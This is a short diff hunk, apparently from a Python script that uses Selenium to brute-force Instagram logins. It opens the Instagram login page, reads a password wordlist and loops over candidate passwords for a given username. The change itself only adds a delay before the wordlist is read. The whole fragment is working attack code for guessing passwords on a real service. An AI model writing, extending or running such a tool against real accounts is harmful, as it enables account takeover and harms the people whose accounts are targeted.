@@ -28,6 +28,7 @@ def instUserCheck(username):
 def instagramBruteforce(username, wordlist, delay):
     driver = webdriver.Firefox()
     driver.get("https://instagram.com/accounts/login")
+    sleep(delay * 2)
     wordlist = open(wordlist, 'r')
     for i in wordlist.readlines():
         password = i.strip("\n")
